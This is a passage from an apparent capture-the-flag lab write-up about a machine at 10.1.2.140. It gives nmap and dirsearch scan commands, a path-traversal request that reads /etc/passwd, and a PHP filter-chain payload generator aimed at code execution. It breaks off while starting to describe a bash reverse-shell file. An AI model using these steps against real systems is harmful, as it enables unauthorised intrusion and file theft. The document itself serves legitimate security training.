### Affected Endpoint ###
Scope
```
    host/url:10.1.2.140
    Description: Access using hacktrace vpn
```
working time: 30 agustus - 2 september 2024

### Description ###
Background Story: The more you read, the more things you will know. The more you learn, the more places you will visit. 

vulnerability: file inclusion and Misuse of Linux Capabilities.

### Impact ###
Impact File Inclusion & Misuse of Linux Capabilities is:
- Information Disclosure.
- Code Execution.
- Privilege Escalation.
- System Integrity Compromise.

### Step To Reproduce ###
The steps in finding  vulnerability are as follows:
- Information Gathering.
- Enumeration.
- Exploit.
- Privilege escalation.
- Reporting.

### PoC ###
#### Information Gathering ####
Just as usual, we start off with the Nmap scan:
```
nmap -sCV -p- --min-rate=1000 -oN nmap -Pn 10.1.2.140
```

There are two ports open: 22 (SSH), 80 (HTTP). Not having any credentials for the SSH service service, we will start with enumerating port 80. 
Scan directory using dirsearch
``` 
dirsearch -u http://10.1.2.140 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```

Try scanning the directory again, this time it's interesting in the bio
```
dirsearch -u http://10.1.2.140/bio -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```

That's it, nothing interesting, try looking into the url

It looks like there is no upload file, I tried view-page:source
![alt text](/assets/images/hacktrace/multishop/image5.png)
There is a name parameter, this can indicate input validation, let's try to change the value 
```
http://10.1.2.140/bio/?name=../../../etc/passwd
```

It turns out that we can do file inclusion, seen from the response given.â€ƒ
Referensi file inclusion :
`https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md`
after reading through it turns out that file inclusion using wrappers (php: //filter) can be entered, we create the payload using the php_filter_chain_generator.py tool 
```
python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
```
later the payload will come out and paste it in the parameter name, if you want the book to continue.

And it does, we can continue to rce, but we have to create a file and live python3 -m http.server, the steps are as follows:
1.	Create a file with the name l (fiel that contains revshel bash) why is the name l and does not contain extensions? because so that the payload is not too long, because it is usually an error, the length of url
